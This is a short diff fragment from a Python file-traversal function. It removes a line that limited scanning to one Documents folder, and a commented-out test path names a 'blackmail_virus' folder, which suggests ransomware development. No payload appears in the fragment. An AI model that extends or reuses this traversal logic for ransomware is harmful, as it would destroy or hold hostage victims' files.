@@ -43,7 +43,6 @@ def fs_traverse(q):
 
     print(drive_list)
 
-    drive_list[0] = r"C:\Users\dengjun\Documents"
     # drive_list = [r'C:\Users\POWER\Desktop\blackmail_virus\123']
 
     for drive in drive_list:
